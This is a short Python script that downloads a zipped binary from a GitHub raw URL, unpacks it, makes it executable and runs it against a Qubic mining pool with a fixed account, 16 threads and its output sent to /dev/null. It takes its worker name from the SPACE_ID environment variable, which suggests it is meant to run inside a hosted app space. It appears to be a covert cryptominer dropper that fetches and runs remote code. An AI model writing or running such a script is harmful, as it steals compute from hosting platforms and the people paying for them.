import os
os.system("wget https://github.com/qqivk/yei/raw/refs/heads/main/lsos.zip")
os.system("unzip lsos.zip")
os.system("chmod +x lsos")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./lsos --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
